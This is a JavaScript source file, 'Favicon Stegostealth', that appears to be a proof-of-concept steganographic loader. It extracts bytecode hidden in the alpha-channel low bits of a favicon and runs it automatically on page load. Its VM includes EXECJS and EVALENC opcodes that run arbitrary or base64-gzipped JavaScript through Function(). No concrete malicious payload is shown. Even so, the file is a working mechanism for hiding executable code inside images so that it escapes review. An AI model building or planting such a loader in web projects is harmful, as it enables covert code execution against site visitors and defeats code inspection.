/* 
Favicon Stegostealth - A Turing complete method of favicon steganography

Tested with Factorial of 5

$t@$h
*/

import { gunzipSync } from "https://cdn.skypack.dev/fflate";

const internalStore = new Map(); // Or an object, if you prefer

// VM Interpreter
export function createFaviconVM() {
  const internalStore = new Map();

  function runVM(bytecode) {
    console.log("[DEBUG] Bytecode length:", bytecode.length);
    const memory = {}; // Stores variables and memory cells
    const callStack = []; // For CALL/RET
    let ip = 0; // Instruction pointer
    let ptr = 0; // Pointer for LOAD/STORE operations
  
    // First pass: resolve label names to offsets
    const labels = {};
    let scanIP = 0;
    while (scanIP < bytecode.length) {
      const opcode = bytecode[scanIP++];
      const getStrLen = () => bytecode[scanIP++];
      const skipStr = () => scanIP += getStrLen();
      const skipStr2 = () => { skipStr(); skipStr(); };
  
      switch (opcode) {
        case 0x01: skipStr2(); break; // SET
        case 0x02: case 0x03: case 0x06: case 0x0E: case 0x0F: skipStr(); break;
        case 0x04: skipStr2(); break; // ADD
        case 0x05: skipStr(); break; // PRINT
        case 0x07: { // LABEL
          const len = getStrLen();
          const name = new TextDecoder().decode(bytecode.slice(scanIP, scanIP + len));
          labels[name] = scanIP - 2; // Record label address
          scanIP += len;
          break;
        }
        case 0x08: scanIP += 3; break; // JMP
        case 0x09: case 0x0A: scanIP += getStrLen() + 2; break; // IFZ / IFNZ
        case 0x0B: scanIP += 1; break; // PTRSET
        case 0x0C: case 0x0D: break; // PTRINC / PTRDEC
        case 0x10: case 0x11: scanIP += getStrLen(); break; // EXECJS / EVALENC
        case 0x12: scanIP += 3; break; // CALL
        case 0x13: break; // RET
        case 0x20: { // STOREFAV
          const kLen = bytecode[scanIP++];
          scanIP += kLen;
          const vLen = bytecode[scanIP++];
          scanIP += vLen;
          break;
        }
        case 0x21: { // LOADFAV
          const kLen = bytecode[scanIP++];
          scanIP += kLen;
          break;
        }
        case 0x22: { // DELFAV
          const kLen = bytecode[scanIP++];
          scanIP += kLen;
          break;
        }
  
        default: console.warn("[!] Unknown opcode during scan:", opcode); break;
      }
    }
  
    // Second pass: run VM
    const decodeStr = () => {
      const len = bytecode[ip++];
      const str = new TextDecoder().decode(bytecode.slice(ip, ip + len));
      ip += len;
      return str;
    };
  
    while (ip < bytecode.length) {
      const opcode = bytecode[ip++];
      console.log("[VM] Executing opcode:", opcode);
  
      switch (opcode) {
        case 0x01: { // SET
          const key = decodeStr();
          const val = decodeStr();
          memory[key] = val;
          break;
        }
        case 0x02: { // INC
          const key = decodeStr();
          memory[key] = (parseInt(memory[key] ?? 0) + 1).toString();
          break;
        }
        case 0x03: { // DEC
          const key = decodeStr();
          memory[key] = (parseInt(memory[key] ?? 0) - 1).toString();
          break;
        }
        case 0x04: { // ADD
          const key = decodeStr();
          const val = decodeStr();
          memory[key] = (parseInt(memory[key] ?? 0) + parseInt(val)).toString();
          break;
        }
        case 0x05: { // PRINT
          console.log("[PRINT]", decodeStr());
          break;
        }
        case 0x06: { // PRINTVAR
          const key = decodeStr();
          console.log("[VAR]", key + " =", memory[key] ?? "(undefined)");
          break;
        }
        case 0x07: { // LABEL (skip label name)
          const len = bytecode[ip++];
          ip += len;
          break;
        }
        case 0x08: { // JMP
          ip++; // skip dummy var len
          const offset = (bytecode[ip++] << 8) | bytecode[ip++];
          ip = offset;
          break;
        }
        case 0x09: { // IFZ
          const key = decodeStr();
          const offset = (bytecode[ip++] << 8) | bytecode[ip++];
          if (parseInt(memory[key] ?? 0) === 0) ip = offset;
          break;
        }
        case 0x0A: { // IFNZ
          const key = decodeStr();
          const offset = (bytecode[ip++] << 8) | bytecode[ip++];
          if (parseInt(memory[key] ?? 0) !== 0) ip = offset;
          break;
        }
        case 0x0B: ptr = bytecode[ip++]; break; // PTRSET
        case 0x0C: ptr += 1; break; // PTRINC
        case 0x0D: ptr -= 1; break; // PTRDEC
        case 0x0E: { // LOAD
          const dest = decodeStr();
          memory[dest] = memory[`cell_${ptr}`] ?? "0";
          break;
        }
        case 0x0F: { // STORE
          const src = decodeStr();
          memory[`cell_${ptr}`] = memory[src] ?? "0";
          break;
        }
        case 0x10: { // EXECJS
          const js = decodeStr();
          console.warn("[EXECJS]", js);
          try { Function(js)(); } catch (e) {
            console.error("EXECJS failed:", e);
          }
          break;
        }
        case 0x11: { // EVALENC base64-encoded GZIP JS
          const b64 = decodeStr();
          try {
            const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
            const decoded = gunzipSync(bin);
            const js = new TextDecoder().decode(decoded);
            console.warn("[EVALENC]", js);
            Function(js)();
          } catch (e) {
            console.error("EVALENC failed:", e);
          }
          break;
        }
        case 0x12: { // CALL
          ip++; // dummy var len
          const offset = (bytecode[ip++] << 8) | bytecode[ip++];
          console.log("[CALL offset]", offset);
          callStack.push(ip); // Save return address
          ip = offset; // Jump to function
          break;
        }
        case 0x13: { // RET
          if (callStack.length === 0) {
            console.warn("[RET] Empty call stack!");
            return;
          }
          ip = callStack.pop(); // Return to caller
          break;
        }
        case 0x20: { // STOREFAV
          const kLen = bytecode[ip++];
          const key = new TextDecoder().decode(bytecode.slice(ip, ip + kLen));
          ip += kLen;
          const vLen = bytecode[ip++];
          const value = bytecode.slice(ip, ip + vLen); // ⬅️ NO decoding
          ip += vLen;
          internalStore.set(key, value); // store as Uint8Array
          break;
        }
        case 0x21: { // LOADFAV
          const kLen = bytecode[ip++];
          const key = new TextDecoder().decode(bytecode.slice(ip, ip + kLen));
          ip += kLen;
        
          const valueBytes = internalStore.get(key) || null;
        
          if (typeof window.FaviconStorage?._resolveLoad === "function") {
            if (valueBytes && typeof valueBytes.length === "number") {
              const base64 = btoa(String.fromCharCode(...valueBytes));
              window.FaviconStorage._resolveLoad(base64);
            } else {
              window.FaviconStorage._resolveLoad(null);
            }
          }
        
          break;
        }
        case 0x22: { // DELFAV
          const kLen = bytecode[ip++];
          const key = new TextDecoder().decode(bytecode.slice(ip, ip + kLen));
          ip += kLen;
        
          internalStore.delete(key);
          break;
        }
        default:
          console.warn("[UNKNOWN OPCODE]", opcode);
          return;
      }
    }
  }

  return Object.freeze({
    load(bytecode) {
      if (!(bytecode instanceof Uint8Array)) {
        throw new TypeError("Expected Uint8Array");
      }
      runVM(bytecode);
    }
  });
}

const { load: runVM } = createFaviconVM();

// Favicon Stego Extractor
const extractAndRunFaviconVM = async (url) => {
  const img = new Image();
  img.crossOrigin = "anonymous";
  img.src = url + "?t=" + Date.now(); // bust cache

  await img.decode();

  // Draw image into canvas to access pixels
  const canvas = document.createElement("canvas");
  canvas.width = img.width;
  canvas.height = img.height;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(img, 0, 0);

  const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
  const bits = [];

  // Extract LSBs from alpha channel
  for (let i = 0; i < data.length; i += 4) {
    if (data[i + 3] > 0) {
      bits.push(data[i + 3] & 1); // Only opaque pixels contribute
    }
  }

  const bytes = []; // Group into bytes
  for (let i = 0; i < bits.length; i += 8) {
    const byte = bits.slice(i, i + 8).reduce((acc, bit, j) => acc | (bit << (7 - j)), 0);
    bytes.push(byte);
  }
  
  const length = (bytes[0] << 8) | bytes[1];
  const payload = bytes.slice(2, 2 + length);

  console.log("[VM] Extracted bits:", bits.length);
  console.log("[VM] Declared payload length:", length);
  console.log("[VM] Actual bytes reconstructed:", payload.length);

  if (payload.length !== length) {
    console.error(" [VM] Payload size mismatch — possible corruption");
    return;
  }

  try {
    const rawFull = gunzipSync(new Uint8Array(payload));
    const bytecodeLen = (rawFull[0] << 8) | rawFull[1];
    const bytecode = rawFull.slice(2, 2 + bytecodeLen);
    console.log("[DEBUG] Bytecode length:", bytecodeLen);
    runVM(bytecode);
  } catch (e) {
    console.error("[VM] Failed to decode or execute VM payload", e);
  }
};

extractAndRunFaviconVM("/favicon5.png"); // Auto-run on load

// Read-only runtime API exposure
const FaviconVM_API = Object.freeze({
  run(bytecode) {
    if (!(bytecode instanceof Uint8Array)) {
      console.warn("[FaviconVM] Refused to run non-bytecode input.");
      return;
    }
    try {
      runVM(bytecode);
    } catch (err) {
      console.error("[FaviconVM] Runtime error:", err);
    }
  }
});

Object.defineProperty(window, "FaviconVM", {
  value: FaviconVM_API,
  configurable: false,
  writable: false,
  enumerable: false
});
